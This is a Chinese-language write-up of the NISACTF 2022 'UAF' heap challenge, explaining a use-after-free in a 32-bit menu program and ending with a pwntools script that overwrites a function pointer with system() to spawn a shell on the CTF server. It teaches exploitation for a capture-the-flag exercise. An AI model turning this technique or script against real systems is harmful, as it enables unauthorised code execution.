[NISACTF 2022]UAF

一、前言

写的第一道堆题，记录一下

二、题目

检查一下保护机制

32位程序，开启了Canary保护和NX保护。

程序流程

是一个菜单程序，先全部把功能执行一遍

创建

输入1，创建一个编号为0的page。

编辑

输入2，然后选择编号，从这里可以看出，如果想编辑编号为0的page，是不允许的。先存疑，后面ida分析看伪代码时再确认

删除

输入3，再输入编号，删除这个page。

打印

输入4，再输入编号，打印这个page。

看一下ida中伪代码

可以发现这一处有后门函数system。

main函数

控制程序流程，看一下漏洞函数，和利用漏洞的函数

漏洞函数

释放堆块的时候，只释放了内存，没有将指针置为NULL，这就导致可以继续利用此指针做一些别的事情。

这就是UAF漏洞，属于指针悬挂。

pwngdb调试

创建一个page，查看一下内存布局

查看0x804b000内存

0x11是此结构体的size，查看一下0x0804862b

可以看到此处是echo函数地址

此函数就是打印函数，也就是菜单程序中的show功能

所以，如果我们将0x0804862b换为system函数地址的话，是不是就能再调用show功能的时候，执行的就是system函数。

所以我们需要修改此处为system函数地址，查看一下edit函数

可以看到，因为我们第一次创建的是0page，但是edit函数无法对0page进行，所以我们需要先释放0page，然后再申请这块内存，再修改。gdb中看以下：

当释放掉0page后，bin中存放着0x804b00这个堆块。再创建一个page查看一下

可以看到这块chunk，又被当作1page申请出来使用，所以我们可以修改1page的内存。

EXP

from pwn import*

sh  = remote("node4.anna.nssctf.cn",28735)

#sh = process('./pwn')

elf = ELF("pwn")

context = {'arch' :'i386','os' : 'linux','log_level':'debug'}

system_addr = 0x080484E0

def creat_chunk():
    sh.recvuntil(":")
    sh.sendline("1")

def edit_chunk(index,content):
    sh.recvuntil(":")
    sh.sendline("2")
    sh.recvuntil("page\n")
    sh.sendline(str(index))
    sh.recvuntil("strings\n")
    sh.sendline(content)

def delete_chunk(index):
    sh.recvuntil(":")
    sh.sendline("3")
    sh.recvuntil("page\n")
    sh.sendline(str(index))

def show_chunk(index):
    sh.recvuntil(":")
    sh.sendline("4")
    sh.recvuntil("page\n")
    sh.sendline(str(index))

creat_chunk()
delete_chunk(0)
creat_chunk()
edit_chunk(1,'sh;\x00'+p32(system_addr))

show_chunk(0)
#gdb.attach(sh)

sh.interactive()
